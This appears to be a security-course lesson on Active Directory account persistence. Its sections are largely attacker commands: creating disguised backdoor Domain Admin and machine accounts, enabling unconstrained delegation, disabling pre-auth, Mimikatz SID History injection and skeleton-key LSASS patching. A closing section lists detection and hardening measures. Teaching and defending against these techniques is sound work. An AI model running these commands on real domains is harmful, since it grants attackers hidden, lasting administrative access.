# User Account Persistence

## Unit 7 - Topic 1 | Persistence

---

## Overview

**User account persistence** creates or modifies Active Directory accounts to maintain long-term access even after the original attack vector is patched. Techniques include creating backdoor accounts, modifying existing accounts, and leveraging legitimate AD features for unauthorized access.

---

## 1. Persistence via Account Creation

```bash
# === CREATE BACKDOOR DOMAIN ACCOUNT ===

# From Windows (net commands):
net user backdoor P@ssw0rd! /add /domain
net group "Domain Admins" backdoor /add /domain

# PowerShell AD module:
New-ADUser -Name "svc_monitor" -AccountPassword \
  (ConvertTo-SecureString 'Str0ngP@ss!' -AsPlainText -Force) \
  -Enabled $true -PasswordNeverExpires $true \
  -Path "OU=Service Accounts,DC=corp,DC=local"
Add-ADGroupMember -Identity "Domain Admins" -Members "svc_monitor"

# === HIDE THE ACCOUNT ===
# Name it like a service account:
# svc_monitor, svc_health, svc_compliance
# Place in OU with many service accounts
# Match naming convention of the environment

# From Linux (Impacket):
addcomputer.py -computer-name 'FAKE01$' \
  -computer-pass 'Pass123!' -dc-ip dc01 corp.local/admin:pass
# Creates machine account (often less monitored)

# === MACHINE ACCOUNT PERSISTENCE ===
# Machine accounts:
# - End with $ (FAKE01$)
# - Less monitored than user accounts
# - Can be used for Kerberos auth
# - Default MachineAccountQuota = 10 (any user can create!)
```

---

## 2. Account Attribute Manipulation

```powershell
# === PASSWORD NEVER EXPIRES ===
Set-ADUser -Identity backdoor -PasswordNeverExpires $true
# Account won't trigger password change requirements

# === HIDE FROM COMMON QUERIES ===
# Set to look like disabled account:
# (but still enabled!)

# === KERBEROS DELEGATION ===
# Enable unconstrained delegation on account:
Set-ADAccountControl -Identity 'FAKE01$' \
  -TrustedForDelegation $true
# Now this machine collects TGTs from anyone who connects!

# === SET SPN FOR LATER ACCESS ===
# Add SPN that won't be questioned:
Set-ADUser -Identity svc_monitor \
  -ServicePrincipalNames @{Add="HTTP/monitor.corp.local"}
# Can use for Kerberos auth later

# === DISABLE PRE-AUTH (AS-REP Roastable) ===
# Intentionally weaken a backup account:
Set-ADAccountControl -Identity backup_user \
  -DoesNotRequirePreAuth $true
# Can always AS-REP roast this account for access

# === ADD TO PROTECTED GROUPS ===
# Less obvious than Domain Admins:
Add-ADGroupMember -Identity "Backup Operators" -Members svc_monitor
# Backup Operators can:
# - Back up files (read anything)
# - Restore files (write anything)
# - Log on to DCs
```

---

## 3. SID History Injection

```bash
# === SID HISTORY PERSISTENCE ===
# Add Domain Admin SID to regular user's SID History
# User appears normal but has DA privileges!

# Mimikatz (requires domain admin):
privilege::debug
sid::patch
sid::add /sam:backdoor_user /new:S-1-5-21-...-512
# 512 = Domain Admins RID
# Now backdoor_user has DA SID in their SID History

# Result:
# - User looks like regular user
# - SID History contains Domain Admin SID
# - Token includes DA group membership
# - Access any resource that DAs can access
# - Very hard to detect!

# === DETECTION ===
# Look for users with SID History:
Get-ADUser -Filter {SIDHistory -like "*"} -Properties SIDHistory
# Or PowerView:
Get-DomainUser -LDAPFilter '(sidHistory=*)'

# === WHY IT'S DANGEROUS ===
# 1. Doesn't show up in group membership queries
# 2. Net group "Domain Admins" won't list the user
# 3. BloodHound can detect it (HasSIDHistory edge)
# 4. Survives password changes
# 5. Works across trusted domains (if SID filtering off)
```

---

## 4. Credential Manipulation

```bash
# === SKELETON KEY ===
# Patches LSASS on DC to accept master password
mimikatz# privilege::debug
mimikatz# misc::skeleton
# Now ANY account can authenticate with "mimikatz" as password
# Original passwords still work too!
# Only persists until DC reboot

# === PASSWORD SPRAYING WITH KNOWN ACCOUNT ===
# Set simple password on backdoor account:
Set-ADAccountPassword -Identity svc_monitor \
  -NewPassword (ConvertTo-SecureString "Simple1!" -AsPlainText -Force)
# Always know how to get back in

# === KERBEROS KEY PERSISTENCE ===
# If you have the AES/RC4 key of an account:
# Store it offline
# Use overpass-the-hash anytime to authenticate
# Works until password is changed
```

---

## 5. Defense Against Account Persistence

| Defense | Implementation |
|---------|---------------|
| **Audit new accounts** | Alert on account creation (Event ID 4720) |
| **Monitor group changes** | Alert on DA/admin group additions (Event ID 4728, 4732) |
| **SID History audit** | Regularly check for SID History presence |
| **MachineAccountQuota** | Set to 0 (prevent user-created machine accounts) |
| **Password expiry** | Enforce on all accounts (audit exceptions) |
| **Account reviews** | Regular review of privileged group membership |
| **Honeypot accounts** | Create monitored accounts that trigger alerts |

```powershell
# Set MachineAccountQuota to 0:
Set-ADDomain -Identity corp.local -Replace @{'ms-DS-MachineAccountQuota'=0}

# Find accounts with PasswordNeverExpires:
Get-ADUser -Filter {PasswordNeverExpires -eq $true} -Properties PasswordNeverExpires
```

---

## Summary Table

| Technique | Stealth | Persistence |
|-----------|:-------:|:-----------:|
| **Backdoor DA account** | 🔴 Low | Until account deleted |
| **Machine account** | 🟡 Medium | Until account deleted |
| **SID History** | 🟢 High | Until SID History cleared |
| **PasswordNeverExpires** | 🟡 Medium | Until policy enforced |
| **Unconstrained delegation** | 🟡 Medium | Until removed |
| **Hidden group member** | 🟡 Medium | Until membership reviewed |

---

## Quick Revision Questions

1. **Why are machine accounts good for persistence?**
2. **How does SID History injection provide hidden admin access?**
3. **What group provides significant access without being Domain Admins?**
4. **How do you detect accounts with SID History modifications?**
5. **Why should MachineAccountQuota be set to 0?**

---

[Next: Golden Ticket Persistence →](02-golden-ticket-persistence.md)

---

*Unit 7 - Topic 1 of 6 | [Back to README](../README.md)*
